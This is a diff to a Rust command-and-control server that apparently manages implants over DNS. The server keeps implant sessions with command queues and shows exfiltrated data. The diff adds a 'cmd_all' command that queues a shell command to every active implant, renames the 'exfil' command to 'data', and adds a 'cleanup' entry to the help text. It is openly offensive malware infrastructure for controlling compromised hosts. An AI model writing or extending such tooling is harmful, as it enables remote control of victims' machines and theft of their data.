@@ -62,15 +62,15 @@ impl From<u16> for QType {
     }
 }
 
-impl QType {
-    fn to_u16(&self) -> u16 {
-        match self {
-            QType::A => 1,
-            QType::TXT => 16,
-            QType::Unknown(v) => *v,
-        }
-    }
-}
+// impl QType {
+//     fn to_u16(&self) -> u16 {
+//         match self {
+//             QType::A => 1,
+//             QType::TXT => 16,
+//             QType::Unknown(v) => *v,
+//         }
+//     }
+// }
 
 // Parsed DNS Question
 pub struct DnsQuestion {
@@ -127,6 +127,19 @@ impl C2State {
         println!("[C2] Added command for {}: {}", implant_id, command);
     }
 
+    /// If there are active sessions, queue commands to every active implant
+    pub fn add_global_command(&mut self, command: &String) {
+        if self.sessions.is_empty() {
+            println!("No active sessions");
+            return;
+        }
+
+        for (id, session) in self.sessions.iter_mut() {
+            session.command_queue.push(command.to_string());
+            println!("[+] Added global command: {} \n to {}: ", command, id);
+        }
+    }
+
     pub fn get_next_command(&mut self, implant_id: &str) -> Option<String> {
         if let Some(session) = self.sessions.get_mut(implant_id) {
             session.last_seen = std::time::SystemTime::now();
@@ -156,6 +169,7 @@ impl C2State {
         );
     }
 
+    /// If there are active sessions, print the sessions IDs, command queue, and elapsed connection time
     pub fn list_sessions(&self) {
         if self.sessions.is_empty() {
             println!("No active sessions");
@@ -447,9 +461,11 @@ pub fn print_banner() {
 
 pub fn print_help() {
     println!("\nCommands:");
-    println!("  cmd <implant_id> <command>  - Queue command for implant");
+    println!("  cmd <implant_id> <command>  - Queue shell command for implant");
+    println!("  cmd_all <command>           - Queue shell command for all active implants");
     println!("  sessions                    - List active implant sessions");
-    println!("  exfil <implant_id>          - Show exfiltrated data");
+    println!("  cleanup                     - Remove stale sessions");
+    println!("  data <implant_id>           - Show exfiltrated data");
     println!("  help                        - Show this help");
     println!("  exit                        - Shutdown server\n");
 }
@@ -485,13 +501,25 @@ pub fn cli_loop(c2_state: Arc<Mutex<C2State>>) {
                 let mut state = c2_state.lock().unwrap();
                 state.add_command(implant_id, &command);
             }
+            "cmd_all" => {
+                if parts.len() < 2 {
+                    println!("Usage: cmd_all <command>");
+                    continue;
+                }
+                let command = parts[1..].join(" ");
+
+                // get and pass a struct of all sessions
+                let mut state = c2_state.lock().unwrap();
+
+                state.add_global_command(&command);
+            }
             "sessions" => {
                 let state = c2_state.lock().unwrap();
                 state.list_sessions();
             }
-            "exfil" => {
+            "data" => {
                 if parts.len() < 2 {
-                    println!("Usage: exfil <implant_id>");
+                    println!("Usage: data <implant_id>");
                     continue;
                 }
                 let implant_id = parts[1];
